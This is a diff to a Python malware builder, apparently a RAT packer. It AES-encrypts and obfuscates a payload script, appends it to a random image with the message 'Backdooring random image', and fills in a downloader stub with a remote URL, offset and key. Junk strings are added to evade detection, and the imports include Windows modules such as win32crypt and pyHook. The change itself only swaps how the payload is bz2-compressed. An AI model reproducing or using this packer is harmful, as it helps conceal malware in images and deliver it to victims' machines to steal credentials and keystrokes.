@@ -15,7 +15,7 @@
 ## more details.
 
 from Crypto.Cipher import AES
-import base64, random, string, sys, os, argparse, subprocess, requests, bz2
+import base64, random, string, sys, os, argparse, subprocess, requests
 
 def randKey(bytes):
 	return ''.join(random.choice(string.ascii_letters + string.digits + "{}!@#$^&()*&[]|,./?") for x in range(bytes))
@@ -99,7 +99,7 @@ pad = lambda s: str(s) + (BLOCK_SIZE - len(str(s)) % BLOCK_SIZE) * PADDING
 EncodeAES = lambda c, s: c.encrypt(pad(s))
 DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
 key, key2, iv, secretkey = randKey(32), randKey(32), randKey(16), randKey(32)
-be64var, bd64var, AESvar, envvar, bz2var, urlvar, keyvar, junkvar = randVar(), randVar(), randVar(), randVar(), randVar(), randVar(), randVar(), randVar()
+be64var, bd64var, AESvar, envvar, urlvar, keyvar, junkvar = randVar(), randVar(), randVar(), randVar(), randVar(), randVar(), randVar()
 xoroffset = random.randint(500,10000)
 junk = junkvar + ' = "' + ''.join(random.choice(string.ascii_letters + string.digits) for x in range(xoroffset)) + xorkey + ''.join(random.choice(string.ascii_letters + string.digits) for x in range(random.randint(500,5000))) + '"'
 junk2 = randVar() + ' = "' + ''.join(random.choice(string.ascii_letters + string.digits) for x in range(random.randint(10,25000))) + '"'
@@ -131,7 +131,7 @@ obstime = subprocess.Popen('python tools/pyobfuscate.py -s %s tempobfs.py' % (''
 readyscript = obstime.stdout.read()
 os.remove('tempobfs.py')
 
-myendings = ['from urllib2 import urlopen as %s' % (urlvar), 'from Crypto import Random', 'from Crypto.Cipher import AES as %s' % (AESvar), 'from base64 import b64decode as %s' % (bd64var), 'from base64 import b64encode as %s' % (be64var), 'from os import getenv as %s' % (envvar), 'from bz2 import decompress as %s' % (bz2var)]
+myendings = ['from urllib2 import urlopen as %s' % (urlvar), 'from Crypto import Random', 'from Crypto.Cipher import AES as %s' % (AESvar), 'from base64 import b64decode as %s' % (bd64var), 'from base64 import b64encode as %s' % (be64var), 'from os import getenv as %s' % (envvar)]
 myimports = ['subprocess', 'platform', 'socket', 'os', 'struct', 'binascii', 'ctypes', 'threading', 'string', 'sqlite3', 'requests', 'sys']
 mywindows = ['win32crypt', 'pyHook', 'pythoncom', 'win32api', 'win32gui', 'win32ui', 'win32con']
 
@@ -140,13 +140,13 @@ random.shuffle(myendings)
 random.shuffle(mywindows)
 
 cipher = AES.new(key)
-downpayload = EncodeAES(cipher, readyscript)
-downpayload = bz2.compress(downpayload)
+downpayload = EncodeAES(cipher, readyscript.encode('bz2'))
 
 image = random.choice(os.listdir("stubs/images"))
 with open('stubs/images/' + image, 'rb') as di:
 	imagedata = di.read()
 imagelen = str(len(imagedata))
+
 print ' [>] Backdooring random image %s..' % image
 downpayload = imagedata + downpayload
 
@@ -167,9 +167,11 @@ else:
 	dlf = 'stubs/downloader_cust.py'
 
 with open(dlf, 'rb') as dl:
-	downloaderscript = dl.read().replace('***URL***', downurl).replace('***B64D***', bd64var).replace('***BZ2***', bz2var).replace('***URLO***', urlvar).replace('***OFFSET***', imagelen).replace('***AESVAR***', AESvar).replace('***AESKEY***', key)
+	downloaderscript = dl.read().replace('***URL***', downurl).replace('***B64D***', bd64var).replace('***URLO***', urlvar).replace('***OFFSET***', imagelen).replace('***AESVAR***', AESvar).replace('***AESKEY***', key)
+
 with open('tempobfs.py', 'wb') as o:
 	o.write(downloaderscript)
+
 obstime = subprocess.Popen('python tools/pyobfuscate.py -s %s tempobfs.py' % (''.join(random.choice(string.ascii_letters + string.digits) for x in range(random.randint(25,80)))), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 downloaderscript = obstime.stdout.read()
 os.remove('tempobfs.py')
